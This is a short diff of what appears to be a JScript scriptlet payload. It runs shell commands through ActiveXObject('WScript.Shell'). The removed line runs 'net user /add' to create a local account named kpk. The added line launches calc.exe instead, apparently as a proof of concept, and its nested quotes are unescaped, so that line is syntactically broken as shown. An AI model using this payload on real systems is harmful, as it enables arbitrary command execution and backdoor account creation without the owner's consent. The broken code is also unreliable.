@@ -13,7 +13,7 @@
 <script language="JScript">
 <![CDATA[
 
-		var r = new ActiveXObject("WScript.Shell").Run("cmd.exe+net+user+/add+kpk+kpk");
+		var r = new ActiveXObject("WScript.Shell").Run("cmd /c "calc.exe"");
 	
 	
 ]]>
